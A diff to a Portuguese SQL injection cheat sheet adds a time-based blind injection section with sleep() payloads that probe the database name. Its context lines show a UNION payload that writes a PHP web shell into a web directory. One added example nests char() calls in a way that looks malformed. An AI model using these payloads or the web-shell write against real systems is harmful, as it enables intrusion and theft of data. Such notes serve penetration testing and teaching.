@@ -70,6 +70,15 @@ Exemplo: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/htm
 
 Exemplo: ‘ union all select 1,2,3,4, “<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23
 
+
+### Time Based
+O Time Based utiliza a função sleep() para verificar se existe uma vulnerabilidade de SQL Injection observando se a página demora para responder após enviar um sleep() em uma requisição ao banco de dados. Caso seja possível, pode-se utilizar o if para verificar informações sobre o banco de dados, tabelas e outras informações como nas outras vulnerabilidades
+
+Exemplo: ' or sleep(5)#
+Exemplo: ' or if (length(database()) = 5, sleep(5), 0)#
+Exemplo: ' or if (database() = char(char(115,116,114,105,110,103)), sleep(5), 0)#
+Exemplo: ' or if (ascii(substring(database(), 1, 1)) = 100, sleep(5), 0)#
+
 ### Information Schema
 Através do information Schema, é possível obter a tabela com usuários e senhas do sistema e obter as informações contidas nela.
 
